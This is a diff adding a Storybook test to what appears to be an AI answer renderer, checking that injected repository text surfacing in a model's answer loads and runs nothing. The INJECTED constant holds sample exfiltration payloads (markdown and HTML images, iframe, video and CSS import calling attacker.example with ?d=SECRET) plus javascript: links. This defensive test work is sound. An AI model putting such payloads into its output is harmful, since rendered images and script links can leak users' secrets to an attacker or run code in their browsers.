@@ -179,6 +179,45 @@ export const Redacted: Story = {
   },
 };
 
+const INJECTED = [
+  "The handler saves the item.",
+  "![the diagram](https://attacker.example/leak.png?d=SECRET)",
+  '<img src="https://attacker.example/raw.png?d=SECRET" alt="raw">',
+  '<iframe src="https://attacker.example/frame"></iframe>',
+  '<video src="https://attacker.example/v.mp4" poster="https://attacker.example/p.png"></video>',
+  "<style>@import url(https://attacker.example/s.css);</style>",
+  '<a href="javascript:alert(1)">run me</a> and [open](javascript:alert(2)).',
+].join("\n\n");
+
+/** What a repository's text could get an answer to say (10.10): nothing in it loads or runs on
+ * its own. An image is its words as a link; frames, media and styles aren't drawn; a script
+ * link is only its words. */
+export const InjectedContent: Story = {
+  args: {
+    message: { ...CITED, parts: [{ type: "text", text: INJECTED }] as AskMessage["parts"] },
+  },
+  play: async ({ canvas }) => {
+    await expect(canvas.getByText(/The handler saves the item/)).toBeVisible();
+    const answer = canvas.getByTestId("answer");
+    await expect(answer.querySelectorAll("img, iframe, video, audio, source, style")).toHaveLength(
+      0,
+    );
+    await expect(canvas.getByRole("link", { name: "the diagram" })).toHaveAttribute(
+      "href",
+      "https://attacker.example/leak.png?d=SECRET",
+    );
+    for (const link of answer.querySelectorAll("a")) {
+      await expect(link.getAttribute("href") ?? "").not.toMatch(/^javascript:/i);
+    }
+    await expect(canvas.queryByRole("link", { name: /run me|open/ })).toBeNull();
+    // Nothing of it asked for anything from elsewhere.
+    const fetched = performance
+      .getEntriesByType("resource")
+      .filter((entry) => entry.name.includes("attacker.example"));
+    await expect(fetched).toEqual([]);
+  },
+};
+
 export const ConfidenceLevels: StoryObj = {
   render: () => (
     <div className="flex gap-4 text-xs">
